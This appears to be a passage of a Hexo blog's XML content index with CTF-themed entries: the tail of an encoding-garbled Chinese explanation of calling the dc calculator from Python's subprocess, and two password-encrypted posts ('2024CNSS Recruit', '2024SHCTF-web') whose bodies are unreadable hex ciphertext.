é€’ç»™ <code>subprocess.run</code> çš„å‚æ•°åˆ—è¡¨ã€‚ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ <code>dc</code> ç¨‹åºçš„åç§°ï¼Œç¬¬äºŒä¸ªå…ƒç´  <code>-e</code> æ˜¯å‘Šè¯‰ <code>dc</code> ä»å‘½ä»¤è¡Œè¯»å–è¡¨è¾¾å¼ï¼Œç¬¬ä¸‰ä¸ªå…ƒç´ æ˜¯å®é™…çš„è¡¨è¾¾å¼å­—ç¬¦ä¸²ã€‚<code>capture_output=True</code>ï¼šè¿™ä¸ªå‚æ•°æŒ‡ç¤º <code>subprocess</code> æ•è·å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯è¾“å‡ºã€‚<code>text=True</code>ï¼šè¿™ä¸ªå‚æ•°è®¾ç½®ä¸º <code>True</code> ä»¥ç¡®ä¿è¾“å‡ºä»¥æ–‡æœ¬å½¢å¼è¿”å›ï¼Œè€Œä¸æ˜¯å­—èŠ‚å½¢å¼ã€‚</p></li><li><p>4.<code>return result.stdout</code>ï¼šå‡½æ•°è¿”å› <code>subprocess.run</code> çš„ç»“æœçš„ <code>stdout</code> å±æ€§ï¼Œå³ <code>dc</code> å‘½ä»¤çš„è¾“å‡ºã€‚è¿™å°†è¿”å›è®¡ç®—ç»“æœçš„å­—ç¬¦ä¸²è¡¨ç¤ºã€‚</p></li></ol><p><a href="https://www.linuxcool.com/dc">dcå‘½ä»¤ â€“ é«˜ç²¾åº¦è®¡ç®—å™¨</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$dc</span> <span class="token number">2</span> <span class="token number">3</span> + p<span class="token operator">></span><span class="token number">5</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0xGame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024CNSS Recruit</title>
      <link href="/2024/10/06/2024CNSS_Recruit/"/>
      <url>/2024/10/06/2024CNSS_Recruit/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9571d6a830a6f71efdb662809cbd809d4fcb7e10fc4297d19251df6cfd5e63cf">39f0446796239c1d1cfa8feb8f605b3bb5fa53736716a21850703403cadc59c5410aba2e6f9550a3168456b4f81ec0a5af1bf6bb52c184307cc5a218e02753705bf0facdb2a8c59613a597bfc373ee47f5aa7fa6918f87135fbed9deb56d731d6733a3d75f7d51af8159559211375e34c363390f037166a54df3d55eb80ff5a51add1cc1fb72246b072ec6981035e68b622b3d821253773bf3d111448f060496d10e1f471a3a14a41fd22b0f8aa5e6f219ad01d0a4cc6a7e43ca9589c7f55d00d7f0b2dd83f9e98b120eb8a2de2b25c5a77eb3c065e53fa2df7e9052225d8225ad04e9174d3dbabdae5c88c300c8e89a027a65a0b700a2b9d76805eefdfd4e32e9d18a9345941efc6ad9d183db67938c4117d10a0110ef9d9c25af524dd37ab4adf38cc5c718c6e5288a50f5d6f139b8886706d666bd2cb6df8378d728df44b229495dae7ab3ebad8dce8cb615d0299a060e9000bb35038611d2f40e1adc4f20ec014f8c0d2d75dca83bda60630e96ca1bdfc22eb76fe9de0b8fa465ad62aec2cb7e4a3c6e21c4387b0472f5273bb3384de87bab759c6e31a9d14f39fb93bb9cbbd8fec6243c23b2bbb69ca7406691ec6ae344848df61b8a4d2a1e7ae0bb9abc443f72722aff1851084acf3186c34bc867406b6fcaa27d121a9ecd9fd018709175287c065a4bade53664eed261a40b849576ce3582d4f778ea69fad6d17389bf6a3dfaa7758b90ee2e5cb25df2bd42b21350ebd685dbf24194301adf79c1d4dc31a0690ce12f093dfeeda266ca4f9f65df020aecdba1590ff64a216d8c14cc5b980d66150e6436b842c00c64f145ee035aae16e480b5dde65540907c9c9632d8c4870c60c7f58eec4a01a2c3cde39b451b22b4da72cf8db70cbd7778db48191262b62d7109f3f21534e38bb30704a60e4254c72433cf1d0a9c4b072348757b93ade0c04c4619beea7740caf262be52087bf485ca0701ccef0a8cae0fc16983bef71a4936c04c8b8e5cb4c0f606fdf6df427a8ac9a00942cb08c16dc002eda10817011859488b8cb025cca5098481e09530c639a04a9e6bd6d9b4700d4a4955092c89df849f66f3437dc05356c20a26dc434f047b820fc6f7412a4e9a5b57ad1e1f7ff39453fe688f5e3a7ed7da1753d02875cd91332ec4b4d2ab216a5b3f8e562349412f805e8027856c372dc9c45f8fc1dd4110f6f9cc2996d27ed91eb570bc852218a4f19e94d659fc78018886b799b6b1b7438ee26238fed84f2b6541f62234b3073cd050bd4ee38bb2e91c4ee3f90ecca908ce432805c9345260ddbdb31a2e2108afbe8b4ef5182673fc0be91aa8b4ea4fb8c3a457b6ea68c399d47d96979ca7823e18bbb5433fade2611b663b39dfd282d58738ff08d6a95ddcc4d581e35e9afafd01a8087fa1a93a953779871cc8125080c45c9073adb769c6235647b26f6cffac2ad43177a0dc5c385a08191e0ae7d359d32dc85b1d95a7a961220fe619502bc7bedf1305a5ca649f558b6a71a93f174d5a922d90a4b90330c4f6af2f68a751653de92e1c37553817558c8a4b2bb9f0cdd31bccddb2986322d1170849d80ccf7658a07c6a6e6e2503f3137cb48bd9ac9cdc604193507d259de3c6dba90cfbfc0cffca6fe2f553562469e1573549ef36b14c8c589371d223a97903835dfeebb5e10695619177fad375679795432a58b8fde28cf8e77c879c3f3258655088aa21b3ade7f503cd98821e532285db8fd63dbb5aee58aeb18e4a0afeedfd9c647bffb955d0c215b060da9712a238040194df6338fec936b0207f0bf10e33b89188c5a86b95ced814cfd581f0deeb6b4fb831fc63213c35d3c2b09d7ea770dbcd4c997f2f9ccdaf546b1684415123bff34dad66b6ca4817c5e04497ef3d01a360382310ca7b3a5ccddad4a24266a5f0dbdf9105f4d49c7ac0b735b6d2e68bc19094b83ed72c570b2890c73970b97848a5b13f324f9b6b8d62c752733226ac42b03cbb455cda770882bb53b307ad0d0d278e15e0df7f7811f93d24952dcb384895a438b656960c5499c6c8f4d88e37feeaa9f1632048d689e84b2946dab928a2dbcbc0d63803df690cd5d41af75a69568c5e6fe931e4f7c11c1a342c8483a1aefad40211866ededa2aa75625d18658a1ef6e39c1db2c802f781c198d9d544d6d5b53990e86a520a458b3f1126059ff8e04ad6b3f4f122752a52317f23750346dd7363d17bc002ec3d60785cf407cd83ef778cc41834227cd15b60035a650fc495155e0784dc372bfc9d6c229e63c134b192ef99d3d738a34e97156aed1aa5d39b1004cd97b11fc128012e8e488b8d9573028e067edac7978671814360fb6f8e879cf027cf43c786d08f801e3bde7d0864dea4ffdc463e7b52959e1da808e96da281aa549a647237b8cfbe3d0e952529bb4f0fc364dbdcb9436cac30e957c9772f4016a4addf9c301b80184235ae036d7ff5b959398ef543c39bedf6d6dd4ab7878f0140bc6e41816c2327a9f9c37056e551e9a8bef3d1867e95be182e475512d377c983cb6c41064148eedaabafab3bdb543797c0ff1dcc474ff398075ec41df4ac6e47942cacf27c01934d0ee1f74695aee76b45333dbb03dfb6eed51204a480eaf1bdc9e13ed2499e82e961dff1ca05faf511b34982be58a5bf2dcfd043ac4ef38dbc6d4417f1d00c4f7c86a013224fbe5e93eb80483847d37c90bf93a6107dc82318c237aea709442698fe38e67c3a869ac34e46c92054d470c5b57adec2f104930bca10645b0321781d5704fcf670bcc707bceabbe5c3717d933de4cbf3303326c5003e551713dfa6e940b34c947142aacc6829734957893b3465bae7bc68feee2333a92489339efeaa9087c117360a513013a564209147041ef3afa8d9c3fd8e76677f3093b3687afaf3d0d4cd7bec1d090cf287a3e50768fe917be9dc434c436d1bbb4ee438c75f97092c53e973457030a3d2f7c3e5affbac140552431ff7e859d5ee96ffdd049d09e67e447134324c63281bd031aa67168a1cea5909ed6918fb30f8c7c66cd4701ae5b38e1f4a95a74a025b5412de02b8e8430e5b5cbe4c2490160ee0a4f38c8c20654bcba6071537e2e8bf83e15b0094aaf92a7cd30e1a963977e323423740878a10b2db6cf31b435d42bfe69d3ef91b4a46ad215e464d6dccc54eb3fd65ccfe64be04cf160a0031263f04ab1c8e7b39eb1dfc9add7f661cd90a7e0e86cd9bac447a0a582eef038075b274ff42dcc69b769c01957470b7f4c54e59e33c201b0909606902a7ac63512672684e4eae7dcb78c0fa4ff1982c584e9a4b224eb152fd8eeea1b68a741b6582c492a1bfa601668b03d091a4fb38556e057ce219663942c7ce4d5a920ae247b0799e9d5326ec293263a70399df43ee690f1cef526ff67b7abf120109a14fe3d6a8712c441b7ec6336797aa82ac85f8e6f6f60329bc03b18f5555f18f0920ec203bab47641f474644ef0d15f3116e4bdc8acf90c6d856667576ea5dd7e823bafae1c52732e251dfa310b6023cf475bcfdf53503b6bb06ec952602c90ec961ef9d77511044a41f57be20c04a15948da474996f00df99e0ca41d83aa4ac9fb1ed9dac829d9cab0fbc5c93e6bb7b0e2def2d814b693177b6aff96896bde681aaea391fffb06801b93264c84fa032b355bda36fa0cc06e531d805c26341e288a052923b04df0bc7ef7114e70fb19a60ed2d8018d57bf222d92a5055504c8ac03de4bdfe463609d36aaf456bf85cdcac4778d6cac1387bd21c3fecc094c78ea5cd3ce1da788aff87d0306887df39d7e0a90bb45b92684a5e72eb7b5b7ec524ea8fb3f2bb792a6ab8d375b0376ed31067d455e05ef2486f4f339ece7cabfac8574124a9ca4b1d02db24b5c9c6b7d1858c6df620dc34f167558c063aad669b1aa3e3b2d1d9500bbe8a10ea6933e105ba34c10eca2ee5049f42811788670a9d33d976c1d1aed996f5a94d8d3a615c26916446885225e687cdf587fd260e615127cf04f5e30c7126def80d7c14801ec3f4219a3439175906aafb54ea147c0f347e17635fbfa80eee87e8347a0b5175248ba341cb0031ba0523fc3a545599867b27bcec93156bbf90ae22b90f9c215321d9d9ed1ec1e4f933ff0c791d4995c85821a609545549fbe5558b147a4fafb2674f02a4e6b60167b03c38b20f3db853a2f2427ac2fd43ea21766cc38e53a19eb2adbfd290d7b9246c0c78d202b4bc9debad9a49f908c1e33bec6e085848dd05850143781b89a4e748f50cfd4de83536c395cddbb96d5926b0a6b2cbdb979df349cb4f5f75f46d639a24ee310a6a891ae4f2fc5d8cc1996752a65d99982b928277cc12b6635d4bbbda223c8c1e71b9ee335f8e4be0d241e1303d989acdc4556fc3bbbd814ef9d66a0b02fe12aafaf332aea1be976682e221c149878443d22b551154e1417303b981cff56f030dfa79fcb4ce06fb69a10d568496cea0370a16ec1aa6b1a1bbbdb539a90461297661362ef3a9514ecbf63cb429aa2610214d9e4b4a6f1883b47aa3c4b3681aac5d79ad3126933f25c6828bec6293accc1ee55a4652e5cd596f4beacb9fd68ed200e0f90391191eb827099d2502691d2914e15391a770b84dd9452dbb2dded88e32e2b817c184986d83cfd9a19a63c827eb9107eeb26e4b51fed09b2347daf17d03f23f27d7346a62a143a52b2977783d863749f9fd0e5140d87c86214e0db7ce8145521a0324bcfb9e40170832ee66e7c68c9784f49d4c713c91ef38a4882c06e35c31b8acb638a27306b5a1900c0fcb5ed33ce48e160d21dd2300b01b9ba7dc8625e45ad22c882cd008e5bb800c8a74c0b44e83484ccb695e141c3a5968272be909fc1b04b79a43d2e97a860bb7912bb5f3fdec42c2b6fd75428560ae98dd2940c682677d9d39c82a377dc4b336a654bcccaa5b5383fac303448b6c64de260234c2fd8c0fd29848d9cc6f0dc8f7bb9a6c176e37b18fe85fd0aaa541f9f5bd1668dda572ac77f1b0e0dd7dcfd414b26f198bd56899ff1612bfeecb4d2ecd0d1a1be5f7243a6ab6f7f61f369e2650be58a43da0f1385dab7f5ca85b34d6da5666a35d9cc33d43bbc5b1368116ac4268786993199deafafafecc8f0d074f8a91c13b92dd7da599de3c87c56105c471baaab58d50cbbb5ab60b6eb2a7f35c285b1998eb69948ac8f30b93f60542df20acbd81f2973109d731305581e8a313d633d1a627cf04943626432a5e591db5ebb7b25ece22401a5ae1c83c6be231b6c687ede49754ee1d66dea5620f75be7e2e9b026bab2b90a239b47fff6bc85777d120e0d585eff5812eeb68114af1d8d3418b7111f3832c493823da1cd5021f984319b1fc2f6f82c9b90bb7db802732d01211f069c236a6ff379846243493ccd365e778cdd9b117e67fd0ceb1344a6e5be77768d2854fcc47232b83c46f2dae62aa27f55f8cd7f1da167179effe09c6d559bd67db96e589ffbaf3666e6b1575cec16e2aea50fe2a1abf64713c68f4feacf038272e57dbb26e0d18576e0d1fccab200be3ca49829871076947855201490022ef03aecf3c624cf94e2dc6b70482efdbbe6e848d5017d70e32137cbf1a536a96ddc7e807365c129d5bdb297aa2411933661d75a37d3f572bfa476616c3ecdf7e48a52fbc94d9c7b6211d389f6a074f99520c013dc8aa6a22967145a806ad5dd075d71fc1f6d4bbf84c1473470de30b7ed198d99801a526f50b2feb392ba7b77a5d5ae65594da7b770c3115b950ead800b5aca080b89d0c56f0a23f28213c51fedea22120dd86541933007569e4103cc2240202fd5d3f6fc9c5ebb695386de11856ed37a85c0ade2afe54cb0b18da04c985ef03fa46fde0ffd5491ece3f75736054498ee9991370d4d4343bda22948cd83f05c84b9d2ea28f18672e0fae3be30a73c7dc5859af48fef750ed88ebfa1ddb8b298e5d4d223f8f16baf5bfbd6bceeeddd5ca4695d7c8fa7bc9bd9d4429c9f55506844996c8851b112b3a055159741f33c129d880b1a8575da210258e9eeb24e640252cae1da18f5c92c2dbdf6a418bcfc9bd2f24066f6f0c09c11a5be9c7cbe6d7bb6b8c03fe8891d5f37c827bad05dc34189d449211928908df4137fae34b5f93a049e7ca6c74b8df53cb0660a9420fc02a9169217badc1bb846433c681c36dc7bf4881aecade7e363652eff04a0f04c348089db6e6fe066c36e644bc8ceccb0629de34f1df7a4e74f55b788b76e02f1904ebb32712d882002cd71c62fd8ca8444596f0711c885b5bd606676cd90e67cf7abefe949c28918d07bb4ec8d6f55103bdec23cedc148cc36859e17e81585e6e07c2b48291e2cf2760ab098e9964ef6926d7ce37bcf4fc18cc475b4557c9472654cdc51a16a95e480a06c8cc35c4b76f81017548c5badd4cf71303974bb05cc80ca440089285e3db7ab6abcf7711588ed3e45d06d0fa153f110fe3ec2f933d370279935fe3b1b9586c39ce83551121886b78a7514f9fca11cf197ccd58aaf33e2bfdf5f3f22c661c3ba44ef74aad3b1b88fd3cd76d77ef59c220b76958979f122d904828367aee009f4bde769a68a61f03e8355b2ee5789998751fef5fd0382e95154c7a7c4030b0047caa6d56245e16eb51e9e4709b3c014a9e76d47d1141695399b989b7f8b2c97acd2c6073cfa8b31218dee10c26a56f3dc25568df2c1f25cb4b99f7178d616fc97e54227d8c8ace544c0e35691db4c7cd5f1114b2cf3515239c84ad942bb557c4eeb4fab4cb7508f1b98418522f3a3149954abac20fd7450261752121d5300a816e0c406f04e73aa2cfe0c8d6af196b979e67fa5a124da390c151b798ad0b379b6088c6858970239af1eafac61233e327b77232f16c1c9fa20b94c078ab702086cae2bb798c11f601ac709297f02582f6fc817b771d07534a115a967afe93d0b85e34803eecc27872ffd397d9a9cc9a871a92c7e9b2e94568909d005adde8126fd839090412d0310e4d663ef851e6a851f15e287ed4100721dd18dba327f83ad8e41316b6e84b400506ad64cde905b58f6d9b8a194094cfde6c39222ff6ae89de05f4b3368e8f602760d180575c2c2ee11c7c7b9d4df43b2a5009282f82d80c8c13b1f8f199d9c9764b5f30c07c061df00401a5f3aeae85e3d53f006baa9f74c00918d06b0c2c3ddea8928bdcde4a211d6bff2ceaafd3f0729e5224faf034fc738f12ee4561453ef273f9c897725b7a09083a5880c14918eaf030a8e4ba35f7498a82b883c1f2d39a0d63a6d5748b67a1f9607faa7690da7dea5209c704f1ca62845107e5e0ca52da68096c81463f2f97eb9a9c5a8320c853997d36d86d771a81f5d1ddfaceb2582551c2d3a939467f55fd954b9313d5a3c51d3f247ddd4e279a4eb3d8edfb18b81083bd3821090caa0e4e9871f315d36ddb9805bef7428dbfa12fe8bf912ad5db80664fdf34c6352ffabf8e9ac98b5239f7f58f7dde9ddd4776bca76b489c4d4fd9640283f18c00c0c2cce2be70e991f684e4265ba284a6b9be68c5333fabb4ffb6d338828ef07d9418838e5bc5af8a4cb8ccf32c7bbb13522014aef3c5624aaa603c77ba25b5c6a287c26c24b51794d2e3bcb989bfcbde4921987905e37dbd67616554abb608ea71089b13e297c4fd103465aedb49b03c75f105813b22b00648eaaec7c093c3572f5ab1f93b80b0949366d720ef683a3543f654d9a30f34f57aa57cf664cf34bc469e39511076a76f40b7fe2e600397e364d96c21f2928d53c75bdbc051bc5601d9fc9bd39a67cf3d6636fd76ffc44e1c8b99b5de259e514ae56c09367d04e38382da7cb44f6425ec7d4b29680c08900e5a346b6f7a4d15fff87e538594faad946af25e473ed92c86683404589c0af8d</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNSS Recruit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024SHCTF-web</title>
      <link href="/2024/10/02/2024SHCTF-web/"/>
      <url>/2024/10/02/2024SHCTF-web/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="524d0cdbbd2d2466b6ca63d138973ff162425119d3413f368192b7d21307d5d2">49128ed7c8de50dece0b3e74053d97544abb8ad726602f0cfeef9b94a8e0188c064f7783adb497e1f9b3df007c052d96616f97d2d6371ec1279e1032f2e5615f2a8422a646c632e80e407bd938a600799240ae94372483808451b3543b013fb3e9ffe544e6f24d0fbadab20b42ad5d96206965d8ff5dbd526ad54436b6a5b60baaaa979970b62dc89b5aa4d321ae26396e2013303b22803368bca38a7748c6080786bac986b3a8f8ae8067af811e6011b66dc7bbe3158643968785d2dacbcb6e2a2363d43467bced1863a4fda6ccb72c010e3b5c6ba2c46ee4f417fa8a9e93caa1d26f74afe0ac06244d8e6b7be09c7a7380db2a8ff25fd84411f3b6bcf4213815e93adf58e3b88e70fe09b07048022321a52aae1a37c32a113bba2a67a31557ed37aa64407e1705413d4642dece1891a378415d4466eaaf161d7f382f42252c19c9eee95aba531cd3dd2229a032acdb5196c65f98bb10b381772fa73c7eca53c6f51ef2d06cad60d0b62a1243ff7c01923501d690f08a71a1ed3da01ffcb869b5e6bf065a7d18b6753bb46ed7875747526228dcd7bc130566879d7823df82c793529f4adef7ccbb90464acc394caaee1235fc955a64f0fae0e00301634b37d7b0ad149caec06a9e7346a8c0a0893db6cbda0cc14accafe79217dbb61a9e15b791a19c47e325b8892c383a80cc814c93cca76e4433a0edcd3c2644245c721a57f18c19b5613e71a64440417cc28e418ac1033230b49d1299a67eae31562fc95f29398507f8a0d57b2ddede3e2915056ba8d8bb4cbe2bc7498a59409c5bd7258624f099717a9c4feba984875c383a4dd56da9c9a19a7473cd1ed64f13f20b803c482ef3dbb39d851c2cdedef0deb89599fe891cdbebb1cd226b2b0fc0ba7571413e1395b94ab4025f36f35ae0df5075d8116978e77e5089c92f226986a0764215b956c4448959fc629084f06d852c15a29590e2cdc1b19b905ebd136dcf8d7898b5d93cf6a48e801a9ec395d93a392d093a660d1af71a073bf542938da984762b19e1829d42c86391b987f18bf47095a9b4270674a43feebd712bdc6fc0a1a125fe4090ee77338d704f59cdf788612dfb99b261b12f571529960a23594e1917c42446d4ec5bf413f5fea99753fabdc57443d1b11a6d25605ca9ecbd2691ad82f4e9ca53de124309b469e8a96b34b1de017f38bd91a347c0868cb01728fb36c860bad2550532eedb38dcc3fe7f13cdcb9fd0520ad3774e4206010a8cc0fe48367351d3109be32f2f833106c77ca840eb6bcc85c1ca2f24c7cf11259ce9f1444acbc503437bbd7f49e1160181f4578b093b8c44fa65520ddf596ba29209afe2de9947f411839f016af36de8839b548daf49df55cecf3c1f6932587f65f08797ab5da8328165edcb36faee42a98f2a086a0e9637057cf84fcba1cf3283327fa9759218a7515979bc6d420df64c5e6491e85d0e2dac2fe695e36bec19023c66677735844afc3dba7bcc102dff53a272efeab88880906d90f9bd171d32cf511f2454e8e7b60f368693bc12d5922bd68a6069db4f67abfcaead002a8b7bd4fb7e9cfaa3502498aaddac6f2d3d1c7741baa55b8b13d72e279465faf123f396e90e02a78909a8a6097c5f15c03cf74935fc6630c2a8ac7021d34da1d536787c8dd157304359884334929d16e50b508627d29ad06ce72b10eb15e4d454c7ab4a0a1b000ac2b84b870647b06a7613c93852ac217a0749f5c1bf0b2b333652429c89315a525dd478d77d6b26ffc5f25a9ff4992dbc667296b388af42ec080ed69f185be137f4527e125d8190f7fa59167121600aea049704f44be2420328afe467042e64a035f7175eaabd0beee2328aea6d9cf32fad8bfea6b141c91ed98b901bff6b2cb6a3676b34afc3faf74f2f8632ff8523e97b9965d44a09df2aa35d534ca2727b7ac93c3d0fc784b9a62152b43e289bbba2e6a14601e7d98da93b2339785d910eff1110a4cb1bb3a89ffdf0813f2240c79d559e43235b0b4e4b22e400378177271a4ee2ed2517609242eede6459f388c2f2652726f4e101d480584fc7fce96d4aefe1062a73c23d927b7cdb9305b70a5ab11cd0d10915f64c518eaeeca1bdd4e73c1ccf6fc1e5f74bc29d0c79a6e6226a2fe304a805a2a471ddf0dfaf3daede9412f78e8fb71592f033ce45095850aa245d67d44133d310409fbe1219d444d06cec499151e74a45dfe26bb38de89daab0b750ded25d5b9bf6dd715e521118d1b8c8aa1641b9c8dbdeef416ddef5080861874ae9ed52558ce35dda0a21e43d5b58abed393b03dc5bd5e4d8a1b3bb275240e761e24e61cdd4a0d24dafb5af3a9845a931eadff0e6c76dec9d12b859e2679ea7f36faa44592f1f153127f099eba07801d068d8eda2ff9318f50ae4ab10526d79965a3f9ad6b78ff0a2aa8a937f354a3d8abe4e932b4585a2f1bebf588e0fb5d69f692360e429a4a07c5a165ea0845855333451cdf84e8b15eb11eb07ca40db5f8b73886ec6258ae7b7f866880bc27b5504bc5e5ddabe1f9349d5691f493178063917acb6e86b1e7644f2827604010a54b4f4dffc7bef7014c8bd64fbe72600a24eda94f7a190dabc83b462bdc6995483039d10711fc70e38f7edd615c504131ec6d55a9e75693b7ef297f45915a6783054d742f3793ad46ceb33ca891c6e20edd966e28d543750eb4e1f239ff954329d38062b0b06d69ee832e3aca2c7ce30b1dc86582bed99b3bfdcde4d815ce87d959d1f18db2b31d806be59e404e58880006e22b5b7ace4d8c3e96c8b32662d7df6405cf2ff3261648b8faca801b76e68ca4707a1da7fa7cf03236a9de394b226f5753e2c41e0c24b3ca7e1d7e30238439ecf3ae1d715a2178817947887b5949cee56c15c7cc21bf2889797bdd7408eb06b386df10ff458fe5e615fb2e45c85dedf0e549e481e35b99116b3e1783d25b97b992e03afdd807bf037898568d9ceedef26c3a85ae6ad314733ae6be09d7461c2a9d7908c10920f1b6456bcfb08d149549452de4c6267f079b3be0d65fd85bdd778a9893d0c01a4ff7472efe6d9e3d2dd3aabf16eabc796fa62c8aa30a34da00b67266db5e08083b1b8947580093af82bac05d6ca7c3fba4b94194587fa2a5c039774216430398dd00a723a2cec1d285567ad830e704b1f9cb72d9b8e4017c0392386a33fec783f97b461b76b8cabd2984a4dd2ab58a10a525af4693f547ee770f52e17fb09965be7ee36a7131874e4869502f709fc345afd65eb9bdad64f91cb01fdcc283e681f114444dc548a66490b86284dece301ba89782792e3ebd52ed46a0d3b6e5a91c26175e5ad9830b45ca411c0c7495d54e0a66a34a36cef52f8200634ac4ef83f8871f340f94d0c6d8d3d8e0ef488770b5eeaef094a4f32bf0a2d4d711e1f8b213f75f5a876b259bf62ac95e835f708faac5e953ac186c65a76fb80b1a1bd7ff7f63fb345695742684875bb17e3a5269c39184c0b2149621ee22bf29eabc5a3719a053fe18d4311de0f8c503e88e52cbb22b6628485b6e7ebe6269fdbd3b3690b3477afb2ba2f66fbf5761ba042c311d162d8427ba701ba883cc32eb3746492606cdbb418ea9b6dda1792be9ff349dc2eee4ef32d0f1056a8a88fdaf4446f61b877270c75a5abf992438fc95b878f61b8adf55ed867399d7958cb30e01bdaae2072221a6dec153878cf2f368ced9bf0db8bc45cb4b263e85c08c1a2bcd433d6b4c928d4ef1cbf91c481d82ecab43d95be1ba6ecdf71f42aab74193450d496d8f910e19730481ba6b8310ee1128115d90ff41750973ff36fd6e2f6bdab59e87338e7ca8195632027e8305b148c971eaab0591af50f1ddff349ee4c0b36ca7a3631aa1f9ea2c99499cd31bec85a933bd8099dab05486917c4ddc50af2e604bd70755edd7a716c3fb9d8876bc9442d3f2e96f7b835c2d18602a5a6c45f17cb6d7316d15e29bbe42bd678e7357405178e02dd68f543530dfa3b2fd51269292f6bdebc3a86badd127593ff8c4dbde94d7654c80b5174109cad169c41db1d90b5ab04bb52cf1c05ec618421e74158d30d4df210cf16f247910bd6be7d58e1f9f3b74f5932d5dc0f2d5c9d0076da0b69da7b09d174573d8c3e091e21d82120305e88136ccca2a2d32fc3484e967a4397bc441c489d65f17f04ed667ecbd524e7f4c649b170ac9c7c962b1f1f1ff0ce227f1a3343bde17970b71b0cd3def32c86779f7f661cbe94b38fe527f46908143aba713cb3419a58ad3eb48e08707530ad1ec16c8a93b9a8e2d1a3a02bcd3d959c2676c3e56e6113ea1ecfe6ecc517252cbd756dde6d04eb2b83417127a46623e78c150a594b4d2485a0aa27f40402433ecebd0337439a16c5ab796a47bb4f5438d2111d554813b18cbf0a1399c7afb09e6245de922b39288e0c7acd4847e50e02c3c6d489a640bc4e0479781d89728f496148c56154bdda5507c925d129e35099887f1201229bd4a09d2001d1c276d43ffbe68fc68ef86e3e77bd6df1d224fe0740c19edf295436aa644a70a2bbc5588c77b48c6976da9964c7860f63ad9c8caf3703724af03501b8730bd48aa3980399b3d037d80314d1af3d5304db8b5da3be7c646b79ab6e15e898e3fa8629fa0b54ee210c3f49e1eb9a965bff44a328323d1463018c609d89407e81c2dd742078bc3a60ce02cca4bc8f2327d319f0fd1c9526c91a8066b7cfaa15ed6676228027e81a6b0475fe1b698e81bfdfcce2d0483122ff332ac2b7d0ecf6906feb91e95b6aa50bfed39e1a5ba6393a6e8c33258bdb24c67d74d16abce6cec69479c6d33be048907b35d01a84f60c21ba9e7847c8684657e37e196328146de361356af1d569ef63e0be9c290f99f03b4bd2b68461a1e7e33f964f373a4d14a45cfc32445e59d4a70d28d9d9a2b4de3d6cfc73c43bca6c28aa23952e87fa9abb96aebfc6d216ebb10a1c690cd014d7acad788b3cd2cbfbe86428cdf4c5a9de9c65de9a78b25b06b666b5f51709f44920e25adcab26b77c4c68720e06c1716e9bcf58e26ca124368dd30c180914ff550984c65be8ff141335eae6cbb7842283389875f018392dcc3f0779dc29bfc232640939f29dda0d46d6b6ece6727c2164ba628ab216cbaf44ccc2865d70e84572f30758c77be770aa4e92c18245ed664c18a2a201ad39f9014104bc03c704c3f67d7fa2014e4cdc0b65730854a0f6e22d9b123cd349220417074b69f8feea06429a362f03e417c56052454d34159c0262f22f166f119de0bd0bacc45e5d30ef2a9a4bed84bfbf4e18f14dd156f80666fad783a672a4b215a5318d9e699ce6095af6678a93d6148a9af77a8c6d139ac05d9b279b07c94c0fa24abc15209b676713203c1487aadc745c2aa81ee0d333799e1bed3f2db54d599bd0223c335099c0f41e31c5e459f7b082cfb14aeca60f3820a2b2681938ae05286c1eeffecc3dbc257e47805db22bd7d075802cdb1a2ad1e04b4bbaee5e26d1f2759562bf93a9e721c5241c4df50c22e417a7e194a7f7fe3ad299bef3ac60f480077f571599f117ea1bcbec9ff0b4a89bd3471bfba9a33d54c498014c6d0971fc0056e9fd4fa905cefca5cdb5f1b44d682730ac96794850f82e083d1ea1bdff900b889d319110f072bba97a863b29321a6a6882e61381d3944ddb17a374c6d06ac010d3253fcd0091873d577e4d59a0516fb280e9b850fbb7050795977e385426e9c8fcb67bac438090b88a4af0e0c32fa76b5c24b585efbe96b12e83217874ab0bfad3fd77135a3421da60bbde20487bf87b54ae5be3c88f2acfe0bb70e1f30635c9520f377636b9ea8a1df39c8bf15b67cad4fefa9468893cbfac339835264ad024a2a98f05afed402ef1e9f7ca37387bb105a7b20a040b8df11ba7e7eac8a60dd347b3785b55f9f3a0a1445cf04d4f49cc98f9f3813cc2ca6480823285a3dd5ec0e80c6e0bccc443ca100cba70e0b3c3e6b0358c083b516b5d479c9355500a5a5777a3c3a22dc31438a8ddaa6422bf0d3f89312e34cb88958246bf7e961f43fabe0c31ab06be106edfeba41ff3954dbb45b7a1d9cfc41fd62742e3e81ac00b48a2d89ad5d8e328a2fb5293f6f9f38b9162c5a68c022a2f6e1c5cf7eb18dd41f502d78aa0c22c9037cebf15a967e20fe14e515c85804e978db61354648b5507794d6898beddabac87eab14b45d0304a206eb3fe8c0ae11d64a62a727c8d41f2d33a58ab378f494dabc4321ce9af0a6bf80cbda911af9937dda9090f14f1edce6c6a365960d6046ced1adb5a53d84e973313d51d7fcd2329ea72155e906927d8fe25ed6dab2018f9242cebc20d36a37a71445dfa5f11ba627d4f004e2e41e386a4069ab8f08dd47f30640a5f2e61a95d7cd09ae597e7624c894ed42aecd4167a96f1b5d596f7d4e537601fd1c05dbe454157a07c7c96fe1b2c7758ba0ffb79849b95fd8f89d63e882